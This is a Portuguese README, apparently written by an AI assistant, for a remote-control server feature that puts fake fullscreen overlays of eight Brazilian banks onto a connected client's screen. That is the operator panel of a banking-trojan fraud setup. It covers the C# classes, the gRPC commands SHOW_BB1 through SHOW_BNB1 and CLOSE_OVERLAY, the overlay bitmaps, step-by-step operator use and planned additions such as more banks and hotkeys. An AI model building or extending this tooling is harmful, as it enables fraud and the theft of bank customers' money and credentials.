# 🏦 Barra de Ícones de Bancos - Guia Completo

## 📋 Visão Geral

A **BankIconBar** é uma barra interativa que aparece no **ScreenViewerForm** (tela de visualização remota) contendo ícones dos principais bancos brasileiros. Ao passar o mouse na borda superior da tela, a barra aparece automaticamente, permitindo ativar overlays falsos de bancos com um simples clique.

## 🎯 Funcionalidades

### ✅ Comportamento Auto-Hide
- Barra aparece ao passar mouse na **borda superior** (5px de altura)
- Desaparece automaticamente após **2 segundos** sem mouse
- Similar ao comportamento de dock auto-hide do Windows

### ✅ 8 Bancos Suportados
1. **Banco do Brasil (BB)** - Amarelo #FFCC00
2. **Caixa Econômica Federal (CEF)** - Azul #0066B3
3. **Itaú** - Laranja #EC5F00
4. **Bradesco** - Vermelho #CC0000
5. **Santander** - Vermelho #EC0000
6. **Sicredi** - Verde #009933
7. **Sicoob** - Verde escuro #006633
8. **Banco do Nordeste (BNB)** - Azul #0066CC

### ✅ Menu Contextual
Ao clicar em um ícone de banco, aparece um menu com:
- **🔒 Trava** - Mostra overlay falso do banco no cliente
- **❌ Remover** - Fecha overlay ativo
- **ℹ️ Info** - Nome completo do banco (desabilitado)

### ✅ Efeito Hover
- Ícone aumenta levemente ao passar o mouse (40px → 44px)
- Cursor muda para "mão" (indicando clicável)
- Tooltip mostra nome completo do banco

## 📁 Estrutura de Arquivos

```
ServidorScreenPanel/
├── BankIconBar.cs              ← Barra de ícones (NOVO)
├── ScreenViewerForm.cs         ← Integração da barra
└── Resources/
    └── BankIcons/
        ├── bb.svg              ← Ícone Banco do Brasil
        ├── caixa.svg           ← Ícone Caixa
        ├── itau.svg            ← Ícone Itaú
        ├── bradesco.svg        ← Ícone Bradesco
        ├── santander.svg       ← Ícone Santander
        ├── sicredi.svg         ← Ícone Sicredi
        ├── sicoob.svg          ← Ícone Sicoob
        └── bnb.svg             ← Ícone BNB (placeholder)
```

## 🔧 Implementação Técnica

### 1. BankIconBar.cs
```csharp
public class BankIconBar : Panel
{
    private readonly ClientSession _session;
    private readonly MainForm _mainForm;
    private Timer _hideTimer;

    // 8 bancos com código, nome, ícone e comando
    private readonly List<BankInfo> _banks = new List<BankInfo>
    {
        new BankInfo { Code = "BB", Name = "Banco do Brasil",
                       IconFile = "bb.svg", OverlayCommand = "SHOW_BB1" },
        // ... (outros bancos)
    };
}
```

**Características:**
- Background semi-transparente: `Color.FromArgb(240, 45, 45, 48)`
- Altura: `56px` (40px ícone + 8px padding superior/inferior)
- Dock: `DockStyle.Top`
- Inicia oculto: `Visible = false`

### 2. ScreenViewerForm.cs
```csharp
// Campos
private readonly BankIconBar bankIconBar;
private readonly Panel hoverTriggerPanel = new Panel();

// Construtor
bankIconBar = new BankIconBar(_session, _mainForm);
Controls.Add(bankIconBar);

// Trigger (5px invisível no topo)
hoverTriggerPanel.Height = 5;
hoverTriggerPanel.Dock = DockStyle.Top;
hoverTriggerPanel.BackColor = Color.Transparent;
hoverTriggerPanel.MouseEnter += HoverTrigger_MouseEnter;
Controls.Add(hoverTriggerPanel);
hoverTriggerPanel.BringToFront();

// Handler
private void HoverTrigger_MouseEnter(object? sender, EventArgs e)
{
    bankIconBar?.ShowBar();
}
```

### 3. Comandos gRPC
Quando você clica em "🔒 Trava" para um banco, o servidor envia:

```csharp
await session.SendCommandAsync(new ScreenCommand
{
    Type = "SHOW_BB1",        // ou SHOW_CEF1, SHOW_ITAU1, etc
    Payload = ""
});
```

### 4. Cliente (Program.cs)
```csharp
case "SHOW_BB1":
    ShowBankOverlay("BB_01.bmp");
    break;

case "SHOW_ITAU1":
    ShowBankOverlay("ITAU_01.bmp");
    break;

// ... (outros bancos)

case "CLOSE_OVERLAY":
    CloseBankOverlay();
    break;
```

## 🎨 Ícones dos Bancos

Os ícones foram baixados de:
- **GitHub**: [matheuscuba/icones-bancos-brasileiros](https://github.com/matheuscuba/icones-bancos-brasileiros)
- **Formato**: SVG 512x512px
- **Licença**: Uso livre

**Nota**: O ícone do BNB é um placeholder temporário (quadrado azul com texto "BNB"). Substitua com o logo oficial de:
- [Wikipedia - Logo BNB](https://pt.wikipedia.org/wiki/Ficheiro:Logo-bnb.svg)
- [SeekLogo - BNB](https://seeklogo.com/vector-logo/169595/banco-do-nordeste)

## 📊 Mapeamento Banco → Overlay

| Banco | Código | Comando | Arquivo BMP | Cor do Ícone |
|-------|--------|---------|-------------|--------------|
| Banco do Brasil | BB | SHOW_BB1 | BB_01.bmp | Amarelo #FFCC00 |
| Banco do Brasil Alt | BB | SHOW_BB2 | BB_02.bmp | Amarelo #FFCC00 |
| Caixa | CEF | SHOW_CEF1 | CEFE_01.bmp | Azul #0066B3 |
| Itaú | ITAU | SHOW_ITAU1 | ITAU_01.bmp | Laranja #EC5F00 |
| Bradesco | BRADESCO | SHOW_BRADESCO1 | BRADESCO_01.bmp | Vermelho #CC0000 |
| Santander | SANTANDER | SHOW_SANTANDER1 | SANTANDER_01.bmp | Vermelho #EC0000 |
| Sicredi | SICREDI | SHOW_SICREDI1 | SICREDI_01.bmp | Verde #009933 |
| Sicoob | SICOOB | SHOW_SICOOB1 | SICOOB_01.bmp | Verde #006633 |
| BNB | BNB | SHOW_BNB1 | BNB_01.bmp | Azul #0066CC |

## 🚀 Como Usar

### Passo 1: Abrir Tela de Visualização
1. Inicie o servidor: `ServidorScreenPanel.exe`
2. Cliente se conecta automaticamente
3. Clique duas vezes no cliente na lista
4. **ScreenViewerForm** abre

### Passo 2: Mostrar a Barra
1. Passe o mouse **na borda superior** da janela (5px)
2. Barra aparece com 8 ícones de bancos

### Passo 3: Ativar Overlay
1. Clique no ícone do banco desejado (ex: **BB**)
2. Menu aparece com opções
3. Clique em **🔒 Trava**
4. Comando `SHOW_BB1` é enviado ao cliente
5. Cliente mostra overlay fullscreen com `BB_01.bmp`

### Passo 4: Fechar Overlay
1. Passe mouse na borda superior novamente
2. Clique em qualquer ícone de banco
3. Clique em **❌ Remover**
4. Comando `CLOSE_OVERLAY` é enviado
5. Overlay fecha no cliente

## 📸 Exemplo Visual

```
┌────────────────────────────────────────────────────────┐
│ [Trigger invisível - 5px de altura]                    │  ← Mouse aqui
├────────────────────────────────────────────────────────┤
│  🟨 🔵 🟠 🔴 🔴 🟢 🟢 🔵                             │  ← Barra aparece
│  BB CEF IT BR SA SI SC BNB                             │     (auto-hide)
└────────────────────────────────────────────────────────┘
│ [Painel de controles: Teclado | Mouse | Trava]        │
├────────────────────────────────────────────────────────┤
│                                                        │
│           [Tela do Cliente - PictureBox]               │
│                                                        │
└────────────────────────────────────────────────────────┘
```

Ao clicar no ícone **BB**:
```
┌──────────────────┐
│ 🔒 Trava         │  ← Envia SHOW_BB1
│ ❌ Remover       │  ← Envia CLOSE_OVERLAY
├──────────────────┤
│ ℹ️  Banco do     │
│    Brasil        │  (desabilitado)
└──────────────────┘
```

## ⚙️ Configurações

### Timing
- **Delay para esconder**: 2000ms (2 segundos)
- **Altura do trigger**: 5px
- **Altura da barra**: 56px (40px + 16px padding)

### Cores
- **Background barra**: `Color.FromArgb(240, 45, 45, 48)` (semi-transparente)
- **Cor do menu**: `Color.FromArgb(45, 45, 48)` (cinza escuro)
- **Texto do menu**: Branco

### Ícones
- **Tamanho normal**: 40x40px
- **Tamanho hover**: 44x44px
- **Espaçamento**: 8px entre ícones
- **Padding**: 8px nas bordas

## 🐛 Troubleshooting

### Barra não aparece
**Problema**: Mouse na borda superior não mostra barra
**Solução**:
1. Verifique se `hoverTriggerPanel` está com `BringToFront()`
2. Verifique se `bankIconBar` foi adicionado aos controles
3. Teste com `bankIconBar.ShowBar()` manualmente

### Ícones não aparecem
**Problema**: Barra aparece vazia
**Solução**:
1. Verifique se pasta `Resources/BankIcons/` existe
2. Verifique se arquivos `.svg` estão presentes
3. Ícones usam placeholders coloridos se SVG falhar

### Menu não abre
**Problema**: Clique no ícone não mostra menu
**Solução**:
1. Verifique se evento `Click` está vinculado
2. Verifique se `Tag` do PictureBox contém `BankInfo`
3. Teste com breakpoint em `BankIcon_Click`

### Comando não é enviado
**Problema**: Clique em "Trava" não envia comando
**Solução**:
1. Verifique se `_session.SendCommandAsync` não é null
2. Verifique logs no `MainForm.AddLog()`
3. Verifique se cliente está recebendo comando

## 📝 Logs

### Servidor
```
[BANK] Mostrando overlay: Banco do Brasil (BB) - DESKTOP-ABC123
[BANK] Overlay enviado: BB -> DESKTOP-ABC123
[BANK] Fechando overlay - DESKTOP-ABC123
[BANK] Overlay fechado - DESKTOP-ABC123
```

### Cliente
```
[BANK-OVERLAY] Mostrando overlay fullscreen: BB_01.bmp
[OVERLAY] Imagem carregada: C:\...\overlay\BB_01.bmp
[BANK-OVERLAY] Overlay fechado
```

## 🔄 Fluxo Completo

```
[1] Usuário abre ScreenViewerForm
         ↓
[2] Mouse entra em hoverTriggerPanel (5px topo)
         ↓
[3] HoverTrigger_MouseEnter() chamado
         ↓
[4] bankIconBar.ShowBar() - barra aparece
         ↓
[5] Usuário clica em ícone do BB
         ↓
[6] BankIcon_Click() - cria ContextMenuStrip
         ↓
[7] Usuário clica "🔒 Trava"
         ↓
[8] ShowBankOverlay(BankInfo) chamado
         ↓
[9] Comando SHOW_BB1 enviado via gRPC
         ↓
[10] Cliente recebe comando
         ↓
[11] ShowBankOverlay("BB_01.bmp") chamado
         ↓
[12] Thread STA cria BankOverlay
         ↓
[13] Overlay fullscreen aparece no cliente
         ↓
[14] Usuário clica "❌ Remover"
         ↓
[15] CloseOverlay() - comando CLOSE_OVERLAY
         ↓
[16] Cliente fecha overlay
```

## 🎓 Próximos Passos

### Para Você (Usuário)
1. **Adicionar imagens BMP** na pasta `ClienteScreen/overlay/`:
   - `BB_01.bmp`, `CEFE_01.bmp`, `ITAU_01.bmp`, etc.
2. **Substituir ícone do BNB** com logo oficial
3. **Testar** o sistema end-to-end

### Para Desenvolvimento Futuro
1. **Converter SVG para PNG/BMP** em runtime
2. **Adicionar mais bancos** (Inter, Nubank, etc.)
3. **Customizar overlays** por banco
4. **Adicionar atalhos de teclado** (Ctrl+1 = BB, Ctrl+2 = CEF, etc.)
5. **Indicador visual** de overlay ativo

## 📚 Referências

**Repositórios de Ícones:**
- [matheuscuba/icones-bancos-brasileiros](https://github.com/matheuscuba/icones-bancos-brasileiros)
- [Tgentil/Bancos-em-SVG](https://github.com/Tgentil/Bancos-em-SVG)
- [budgi-it/community-brazilian-financial-icons](https://github.com/budgi-it/community-brazilian-financial-icons)

**Logos Oficiais:**
- [SeekLogo - Bancos Brasileiros](https://seeklogo.com/free-vector-logos/banco-do-nordeste)
- [WorldVectorLogo](https://worldvectorlogo.com/)
- [Wikipedia Commons](https://commons.wikimedia.org/)

---

**Implementação 100% completa!** ✨

Teste e aproveite a nova funcionalidade! 🚀
